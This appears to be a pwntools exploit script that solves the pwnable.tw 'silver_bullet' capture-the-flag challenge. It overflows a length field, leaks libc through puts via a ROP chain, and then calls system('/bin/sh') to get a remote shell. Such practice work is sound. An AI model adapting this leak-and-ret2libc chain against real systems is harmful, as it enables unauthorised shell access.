#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('silver_bullet', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*power_up+105
        b*power_up+85
        c
        ''')
        sleep(1)

# nc chall.pwnable.tw 10103
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10103)
else:
    p = process([exe.path])

def trigger():
    slna(b'Your choice :', 1)
    sa(b'Give me your description of bullet :', b'a'*0x2c)

    slna(b'Your choice :', 2)

    sa(b'Give me your another description of bullet :', p32(0xffffffff))

    slna(b'Your choice :', 2)
trigger()

load = flat(
    p8(0xff) + p16(0xffff) + b'c'*4,
    exe.plt.puts,
    exe.sym.main,
    exe.got.puts
)

sa(b'Give me your another description of bullet :', load)

slna(b'Your choice :', 3)
a = ru(b'Oh ! You win !!\n')

libc_leak = u32(r(4))
libc.address = libc_leak - libc.sym.puts


info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

trigger()
GDB()

load  = flat(
    p8(0xff) + p16(0xffff) + b'c'*4,
    libc.sym.system,
    next(libc.search(b'/bin/sh')),
    next(libc.search(b'/bin/sh')),

)
sa(b'Give me your another description of bullet :', load)
slna(b'Your choice :', 3)


p.interactive()
